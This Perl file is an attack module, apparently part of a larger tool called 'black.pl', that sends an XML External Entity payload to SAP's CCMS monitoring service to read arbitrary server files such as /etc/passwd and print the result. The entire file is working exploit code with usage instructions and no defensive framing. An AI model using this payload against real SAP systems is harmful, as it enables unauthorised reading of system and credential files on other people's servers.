#!/usr/bin/perl
# Module SMB relay CCMS service (XML External Entities)

# CONFIG
######################
my $desc ="CCMS service (/sap/bc/ccms/monitoring/CCMS_XML) error based read OS file (XML External Entities) \n\t Usage: black.pl .. .. -m id_module <path> \n\t Path like this: /etc/passwd\n"; 
our $funcName="ccms_xxe_read_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub ccms_xxe_read_Func()
{
	
	my $XML='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE SAP_CCMS:DataSupplierReport [ <!ENTITY dsec SYSTEM "%PATH%">
<!ELEMENT SAP_CCMS:DataSupplierReport (test*)>
<!ATTLIST SAP_CCMS:DataSupplierReport aaaa ENTITY #REQUIRED>
]>
<SAP_CCMS:DataSupplierReport aaaa="&dsec;" >
	';
	
	if ($ARGV[$m_arg_i+1]){
		$path=$ARGV[$m_arg_i+1];
		print $path." - path \n\n";	
	} else {
		print "Error. Please, enter path name\n";
		exit;
	}

	
	$XML=~s/%PATH%/$path/s;
	
	#print "$XML\r\n";
	
	my @answers=send_soap($XML,1, '/sap/bc/ccms/monitoring/CCMS_XML');

	my $answer=join('', @answers);

	print "$answer\r\n";
	
	print "\n\n";

}